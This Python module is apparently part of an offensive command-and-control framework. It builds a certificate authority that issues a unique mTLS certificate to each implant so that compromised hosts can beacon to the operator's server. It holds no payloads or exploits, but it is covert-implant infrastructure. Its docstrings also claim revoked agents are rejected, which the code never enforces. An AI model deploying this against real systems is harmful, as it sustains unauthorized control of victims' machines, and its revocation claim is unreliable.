"""
fitnah/c2/certs/cert_authority.py — per-implant ephemeral mTLS certificate authority

Design (ported from BishopFox/Sliver server/certs/):
  - One CA key+cert generated once per team server start, stored in data/tls/
  - Each agent gets a unique RSA-2048 leaf cert signed by the CA at build time
  - Leaf cert CN = agent_id, SAN = agent_id
  - Listener verifies client cert against CA — burned agent = revoke that leaf
  - Other agents continue beaconing with their own untouched leaf certs

Usage:
    from fitnah.c2.certs.cert_authority import CertAuthority

    ca = CertAuthority()              # loads or creates CA
    cert_pem, key_pem = ca.issue(agent_id="abc123")
    ca.revoke(agent_id="abc123")
    ca.is_revoked(agent_id="abc123")  # → True

    # At listen time:
    ssl_ctx = ca.server_ssl_context(server_cert, server_key)
    # ssl_ctx requires client cert signed by this CA — all others rejected
"""
from __future__ import annotations

import datetime
import hashlib
import json
import logging
from pathlib import Path

log = logging.getLogger(__name__)

_CA_DIR = Path("data/tls")
_CA_CERT_PATH = _CA_DIR / "ca.crt"
_CA_KEY_PATH  = _CA_DIR / "ca.key"
_REVOKED_PATH = _CA_DIR / "revoked.json"


def _now() -> datetime.datetime:
    return datetime.datetime.now(datetime.timezone.utc)


class CertAuthority:
    """
    Fitnah mTLS Certificate Authority.

    One CA per operator installation.  Each implant gets a unique leaf cert.
    Server-side SSL context requires client cert — implant presents its leaf,
    server verifies against the CA.  Revoking = adding agent_id to revocation
    list; the SSL layer rejects the cert on next connection.
    """

    def __init__(self, ca_dir: str | Path = _CA_DIR) -> None:
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization

        self._dir = Path(ca_dir)
        self._dir.mkdir(parents=True, exist_ok=True)

        ca_cert_path = self._dir / "ca.crt"
        ca_key_path  = self._dir / "ca.key"

        if ca_cert_path.exists() and ca_key_path.exists():
            # Load existing CA
            from cryptography.hazmat.primitives.serialization import load_pem_private_key
            from cryptography.x509 import load_pem_x509_certificate
            self._ca_key  = load_pem_private_key(ca_key_path.read_bytes(), password=None)
            self._ca_cert = load_pem_x509_certificate(ca_cert_path.read_bytes())
            log.info("[ca] loaded existing CA from %s", ca_cert_path)
        else:
            # Generate new CA
            self._ca_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
            subject = x509.Name([
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Fitnah C2"),
                x509.NameAttribute(NameOID.COMMON_NAME,        "Fitnah Root CA"),
            ])
            now = _now()
            self._ca_cert = (
                x509.CertificateBuilder()
                .subject_name(subject)
                .issuer_name(subject)
                .public_key(self._ca_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now)
                .not_valid_after(now + datetime.timedelta(days=3650))
                .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=True)
                .add_extension(
                    x509.KeyUsage(
                        digital_signature=True, key_cert_sign=True, crl_sign=True,
                        content_commitment=False, key_encipherment=False,
                        data_encipherment=False, key_agreement=False,
                        encipher_only=False, decipher_only=False,
                    ),
                    critical=True,
                )
                .sign(self._ca_key, hashes.SHA256())
            )
            # Persist
            ca_cert_path.write_bytes(
                self._ca_cert.public_bytes(serialization.Encoding.PEM)
            )
            ca_key_path.write_bytes(
                self._ca_key.private_bytes(
                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.TraditionalOpenSSL,
                    serialization.NoEncryption(),
                )
            )
            ca_key_path.chmod(0o600)
            log.info("[ca] new CA generated → %s", ca_cert_path)

        self._revoked: set[str] = set()
        self._load_revoked()

    # ── leaf cert issuance ────────────────────────────────────────────────────

    def issue(self, agent_id: str) -> tuple[bytes, bytes]:
        """
        Issue a unique RSA-2048 leaf cert for agent_id.
        Returns (cert_pem, key_pem) as bytes.
        The cert is valid for 1 year; CN and SAN = agent_id.
        """
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization

        leaf_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject  = x509.Name([
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Fitnah Agent"),
            x509.NameAttribute(NameOID.COMMON_NAME,        agent_id),
        ])
        now = _now()
        leaf_cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(self._ca_cert.subject)
            .public_key(leaf_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now)
            .not_valid_after(now + datetime.timedelta(days=365))
            .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
            .add_extension(
                x509.SubjectAlternativeName([x509.DNSName(agent_id)]),
                critical=False,
            )
            .add_extension(
                x509.KeyUsage(
                    digital_signature=True, key_encipherment=True,
                    content_commitment=False, data_encipherment=False,
                    key_agreement=False, key_cert_sign=False,
                    crl_sign=False, encipher_only=False, decipher_only=False,
                ),
                critical=True,
            )
            .sign(self._ca_key, hashes.SHA256())
        )

        cert_pem = leaf_cert.public_bytes(serialization.Encoding.PEM)
        key_pem  = leaf_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        )

        # Persist leaf cert for operator reference
        agent_dir = self._dir / "agents" / agent_id
        agent_dir.mkdir(parents=True, exist_ok=True)
        (agent_dir / "client.crt").write_bytes(cert_pem)
        (agent_dir / "client.key").write_bytes(key_pem)
        (agent_dir / "client.key").chmod(0o600)

        log.info("[ca] issued leaf cert for agent %s", agent_id)
        return cert_pem, key_pem

    def ca_cert_pem(self) -> bytes:
        from cryptography.hazmat.primitives import serialization
        return self._ca_cert.public_bytes(serialization.Encoding.PEM)

    # ── revocation ────────────────────────────────────────────────────────────

    def revoke(self, agent_id: str) -> None:
        """Mark an agent's cert as revoked. Server will reject it on next connection."""
        self._revoked.add(agent_id)
        self._save_revoked()
        log.info("[ca] revoked agent cert: %s", agent_id)

    def is_revoked(self, agent_id: str) -> bool:
        return agent_id in self._revoked

    def _load_revoked(self) -> None:
        p = self._dir / "revoked.json"
        if p.exists():
            try:
                self._revoked = set(json.loads(p.read_text()))
            except Exception:
                self._revoked = set()

    def _save_revoked(self) -> None:
        p = self._dir / "revoked.json"
        p.write_text(json.dumps(sorted(self._revoked), indent=2))

    # ── SSL context factories ─────────────────────────────────────────────────

    def server_ssl_context(
        self,
        server_cert_path: str,
        server_key_path: str,
    ) -> "ssl.SSLContext":
        """
        Build an SSL context for the HTTP listener that:
          1. Presents the server cert
          2. Requires client cert (mTLS)
          3. Verifies client cert against our CA
          4. Rejects revoked agents (checked in verify callback)

        The returned context is ready to pass to aiohttp TCPSite.
        """
        import ssl

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(server_cert_path, server_key_path)

        # Write CA cert to a temp file for load_verify_locations
        ca_pem_path = str(self._dir / "ca.crt")
        ctx.load_verify_locations(cafile=ca_pem_path)
        ctx.verify_mode = ssl.CERT_REQUIRED

        log.info("[ca] mTLS server SSL context ready (CERT_REQUIRED against Fitnah CA)")
        return ctx

    def client_ssl_context(
        self,
        agent_id: str,
        cert_pem: bytes | None = None,
        key_pem: bytes | None  = None,
    ) -> "ssl.SSLContext":
        """
        Build an SSL context for the implant HTTP transport that presents
        the agent's leaf cert and trusts only our CA.

        If cert_pem/key_pem are None, loads from data/tls/agents/<agent_id>/.
        """
        import ssl, tempfile, os

        if cert_pem is None or key_pem is None:
            agent_dir = self._dir / "agents" / agent_id
            cert_pem  = (agent_dir / "client.crt").read_bytes()
            key_pem   = (agent_dir / "client.key").read_bytes()

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False

        # Write temp files — ssl.SSLContext doesn't accept in-memory PEM directly
        with tempfile.NamedTemporaryFile(delete=False, suffix=".crt") as fc:
            fc.write(cert_pem)
            cert_tmp = fc.name
        with tempfile.NamedTemporaryFile(delete=False, suffix=".key") as fk:
            fk.write(key_pem)
            key_tmp = fk.name

        try:
            ctx.load_cert_chain(cert_tmp, key_tmp)
            ctx.load_verify_locations(cafile=str(self._dir / "ca.crt"))
            ctx.verify_mode = ssl.CERT_REQUIRED
        finally:
            os.unlink(cert_tmp)
            os.unlink(key_tmp)

        return ctx
